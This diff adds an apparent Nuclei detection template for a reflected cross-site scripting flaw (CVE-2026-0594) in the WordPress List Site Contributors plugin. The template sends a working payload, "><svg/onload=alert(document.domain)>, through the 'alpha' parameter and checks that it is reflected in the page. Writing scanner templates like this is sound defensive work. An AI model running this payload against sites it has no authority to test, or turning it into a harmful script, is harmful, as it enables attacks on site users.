@@ -1,0 +1,40 @@
+id: CVE-2026-0594
+
+info:
+  name: WordPress List Site Contributors - Reflected XSS
+  author: m4sh_wacker
+  severity: high
+  description: |
+    The List Site Contributors plugin for WordPress is vulnerable to Reflected Cross-Site Scripting 
+    via the 'alpha' parameter in versions up to, and including, 1.1.8 due to insufficient input 
+    sanitization and output escaping. This makes it possible for unauthenticated attackers to 
+    inject arbitrary web scripts in pages that execute if they can successfully trick a user 
+    into performing an action such as clicking on a link.
+  reference:
+    - https://github.com/m4sh-wacker/CVE-2026-0594-ListSiteContributors-Plugin-Exploit
+  tags: wordpress,wp-plugin,xss,cve2026,m4sh_wacker
+
+http:
+  - raw:
+      - |
+        GET /wp-json/wp/v2/pages HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /{{slug}}/?alpha="><svg/onload=alert(document.domain)> HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: slug
+        internal: true
+        part: body
+        regex:
+          - '(?s)"slug":"([^"]+)".*?\?alpha='
+        group: 1
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<svg/onload=alert(document.domain)>"
